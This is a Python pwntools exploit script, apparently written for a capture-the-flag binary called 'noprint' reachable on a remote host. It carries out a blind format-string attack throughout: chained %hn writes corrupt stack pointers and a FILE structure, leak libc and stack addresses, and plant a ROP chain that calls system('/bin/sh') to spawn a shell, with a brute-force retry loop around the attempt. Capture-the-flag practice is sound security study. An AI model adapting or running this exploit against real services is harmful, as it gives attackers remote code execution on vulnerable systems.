from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess
from itertools import *
from more_itertools import *

file = './noprint'
exe_args = []
PREFIX = (b": ", b"> ")
speed = 0.1

io: process = None

def debug(pid=io):
    gdb.attach(pid, gdbscript=
    """
    define bfmt
    b *((char*)&main+0xc3)
    end
    c
    """, exe=file)
    input("debug")

def launch_remote():
    global file, io
    host = args.HOST if args.HOST else 'noprint.phreaks2600.fr'
    port = args.PORT if args.PORT else 1337
    io = remote(host, port)

def launch_docker():
    global file, io
    io = remote("localhost", 1337)
    if args.GDB:
        out = subprocess.run(["pgrep", "--newest", "^run$"], capture_output=True)
        debug(int(out.stdout))

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug(io)

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rol(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: ror(addr, 17) ^ cookie
ptr_getcookie = lambda mangled, demangled: ptr_demangle(mangled, demangled)
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
slaprefix = lambda a: sla(PREFIX, a)
saprefix = lambda a: sa(PREFIX, a)
choice = lambda a: snum(PREFIX, a)

def printx(**kwargs):
    for k, v in kwargs.items():
        success("%s: %#x" % (k, v))

def launch():
    if args.REMOTE:
        l = launch_remote
    elif args.DOCKER:
        l = launch_docker
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]
def getr(d, p):
    return re.findall(p, d)[0]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = exe.libc
context.binary = exe

tries = 0

def exploit():
    def send(a):
        if type(a) == str:
            a = a.encode()
        sl(a)
        sleep(speed)
    
    send(f"%*45$c%45$hn") # copy 16low stack at 46
    # send(f"%*12$c%{0xb98+2}c%40$hn") # copy 16low libc at 47
    send(f"%*9$c%40$hn") # copy 16low heap iofile at 47

    send(f"%*46$c%{0x10000-0x120}c%11$hn")
    send(f"%*47$c%{0x58}c%31$hn")

    send(b"A"*0x18 + p8(1))
    send(f"%*47$c%{0x10000-0x110}c%31$hn")



    leak = recv()
    if len(leak) <= 0x20:
        raise EOFError

    # debug(io)
    send(f"%{0x2086}c%9$hn")

    # payload = flat([
    #     b"\0"*0xc8,
    #     0x1e1,
    #     p32(0xfbad2086),
    # ])
    # send(payload)

    # sleep(0.5)

    send(f"%{0x1000}c")

    send("libc=%12$p; stack=%11$p;")
    recvu(b"libc=")
    libc.address = int(recvu(b";", 1), 16) - 0x2a3b8
    recvu(b"stack=")
    stack = int(recvu(b";", 1), 16)
    printx(libc=libc.address, stack=stack)

    sleep(speed)

    send(f"%{(stack+0x70)&0xffff}c%11$hn done")
    recvu(b"done")
    send(f"%{(stack-0xa8+2)&0xffff}c%31$hn done")
    recvu(b"done")
    send(f"%{(stack+0x48)&0xffff}c%11$hn done")
    recvu(b"done")
    send(f"%{(stack-0xa8+4)&0xffff}c%31$hn done")
    recvu(b"done")
    send(f"%{(stack-0xa8)&0xffff}c%11$hn done")
    recvu(b"done")
    # io.interactive()

    target = stack+0x28

    payload = f""
    payload += f"%{target&0xffff}c%31$hn%{0x10000-(target&0xffff)}c"
    target >>= 16
    payload += f"%{target&0xffff}c%45$hn%{0x10000-(target&0xffff)}c"
    target >>= 16
    payload += f"%{target&0xffff}c%40$hn done"
    send(payload)
    recvu(b"done")

    add_rsp_gadget = libc.address + 0x0000000000125af7

    payload = f""
    payload += f"aaaaaaaaa"
    payload += "done"
    payload = payload.encode().ljust(0x80, b"\0")
    payload += flat([
        stack-0xd8,
        stack-0xd8+2,
        stack-0xd8+4,
        [0]*5,

        libc.address + 0x00000000000cee4d,
        binsh(),
        libc.sym.do_system+2,
    ])
    send(payload)
    recvu(b"done")

    target = add_rsp_gadget
    payload = f""
    payload += f"%{target&0xffff}c%52$hn%{0x10000-(target&0xffff)}c"
    target >>= 16
    payload += f"%{target&0xffff}c%53$hn%{0x10000-(target&0xffff)}c"
    target >>= 16
    payload += f"%{target&0xffff}c%54$hn%{0x10000-(target&0xffff)}c"
    target >>= 16
    payload += f"done"
    send(payload)
    recvu(b"done")

    # sleep(speed)

    # sleep(speed)

    # send(f"%p %p %p %p %p %p")

    io.interactive()
    exit()

    send(f"%*46$c%{0x10000-0x120}c%11$hn")
    send(f"%*47$c%31$hn")

    send(f"%*46$c%{0x10000-0x30}c%11$hn")
    send(f"%*46$c%{0x10000-0x230+2}c%31$hn")

    send(f"%*46$c%{0x10000-0x58}c%11$hn")
    send(f"%*46$c%{0x10000-0x328}c%31$hn")
    
    # pause()
    payload = ""
    # payload += f"%{0x6873}c%35$n"
    # payload += f"%{0x10000-0x6873}c"
    # payload += f"%40$hhn"
    # payload += f"%*c%45$hn"
    
    payload += f"%40$hhn"
    payload += f"%*c%45$hn"
    payload += f"%"
    payload += f"%{0x6873}c%35$n"
    
    
    send(payload)
    

    io.interactive()
    exit()

if not args.BF:
    launch()
    exploit()
    exit()
else:
    tries_prog = log.progress("Tries")
    while True:
        tries += 1
        tries_prog.status(str(tries))

        launch()
        try:
            exploit()
        except EOFError:
            pass

        with context.local(log_level=logging.ERROR):
            io.close()
